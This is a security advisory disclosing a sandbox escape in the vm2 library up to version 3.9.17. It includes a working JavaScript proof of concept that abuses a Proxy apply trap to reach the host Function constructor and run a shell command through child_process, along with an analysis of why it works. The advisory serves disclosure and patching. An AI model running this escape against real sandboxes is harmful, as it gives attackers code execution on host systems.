# Sandbox Escape in vm2@3.9.17

A sandbox escape vulnerability exists in [vm2](https://github.com/patriksimek/vm2) for versions up to 3.9.17. It abuses an unexpected creation of a host object based on the specification of Proxy, and allows RCE via `Function` in the host context.

## Impact

A threat actor can bypass the sandbox protections to gain remote code execution rights on the host running the sandbox.

## PoC

##
#
https://gist.github.com/arkark/e9f5cf5782dec8321095be3e52acf5ac
#
##

```js
const { VM } = require("vm2");
const vm = new VM();

const code = `
  const err = new Error();
  err.name = {
    toString: new Proxy(() => "", {
      apply(target, thiz, args) {
        const process = args.constructor.constructor("return process")();
        throw process.mainModule.require("child_process").execSync("echo hacked").toString();
      },
    }),
  };
  try {
    err.stack;
  } catch (stdout) {
    stdout;
  }
`;

console.log(vm.run(code)); // -> hacked
```

## Analysis

`err.name.toString` is called at [`ErrorPrototypeToString` in `prepareStackTrace`](https://github.com/nodejs/node/blob/v20.1.0/lib/internal/errors.js#L126) from the host context.

- `error` argument of `prepareStackTrace` is not proxied by handlers defined in [`vm2/lib/bridge.js`](https://github.com/patriksimek/vm2/blob/3.9.17/lib/bridge.js) because the function is called directly by V8.
- ref. https://v8.dev/docs/stack-trace-api

Also, the definition of `[[Call]]` internal method of a Proxy object is as follows:

- https://tc39.es/ecma262/2022/multipage/ordinary-and-exotic-objects-behaviours.html#sec-proxy-object-internal-methods-and-internal-slots-call-thisargument-argumentslist

> 7. Let argArray be CreateArrayFromList(argumentsList).<br>
> 8. Return ? Call(trap, handler, « target, thisArgument, argArray »).

When `err.name.toString` is called, the step 7 creates `argArray` in the host context and the host object is passed to `args` of `apply(target, thiz, args)`. So, you can access `Function` constructor of the host context.

## Credits

Takeshi Kaneko (GMO Cybersecurity by Ierae, Inc.)
